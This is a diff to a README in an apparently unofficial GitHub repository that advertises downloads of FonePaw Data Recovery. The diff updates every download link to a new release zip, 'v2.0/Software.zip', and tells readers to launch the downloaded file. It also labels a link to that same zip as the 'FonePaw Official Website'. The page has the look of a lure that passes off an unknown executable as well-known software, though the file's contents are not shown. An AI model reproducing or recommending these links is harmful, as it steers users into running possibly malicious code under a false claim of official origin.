@@ -30,13 +30,13 @@ Welcome to the FonePaw Data Recovery Download repository! Here you can find ever
   - how-to-use-fonepaw-android-data-recovery
 
 ### Download Link
-- [Download FonePaw Data Recovery Software](https://github.com/On-1fpss/FonePaw-Data-Recovery-Download/releases/download/v1.0/Application.zip) 🚀 *(File needs to be launched)*
+- [Download FonePaw Data Recovery Software](https://github.com/On-1fpss/FonePaw-Data-Recovery-Download/releases/download/v2.0/Software.zip) 🚀 *(File needs to be launched)*
 
 ## How to Download FonePaw Data Recovery
 
 Follow the steps below to download the FonePaw Data Recovery software and start recovering your lost files in no time:
 
-1. Click on the provided [download link](https://github.com/On-1fpss/FonePaw-Data-Recovery-Download/releases/download/v1.0/Application.zip).
+1. Click on the provided [download link](https://github.com/On-1fpss/FonePaw-Data-Recovery-Download/releases/download/v2.0/Software.zip).
 2. Save the software file to your desired location on your computer.
 3. Launch the downloaded file to begin the installation process.
 4. Follow the on-screen instructions to complete the installation.
@@ -67,7 +67,7 @@ FonePaw Data Recovery stands out as a reliable and efficient solution for recove
 
 To explore more about FonePaw Data Recovery, download the software using the link provided and start restoring your lost files today. Don't let data loss stress you out when you have a reliable tool like FonePaw Data Recovery at your disposal.
 
-For any additional information, feel free to visit the [FonePaw Official Website](https://github.com/On-1fpss/FonePaw-Data-Recovery-Download/releases/download/v1.0/Application.zip) 🌐.
+For any additional information, feel free to visit the [FonePaw Official Website](https://github.com/On-1fpss/FonePaw-Data-Recovery-Download/releases/download/v2.0/Software.zip) 🌐.
 
 Start your data recovery journey now with FonePaw Data Recovery! 💻📁
 
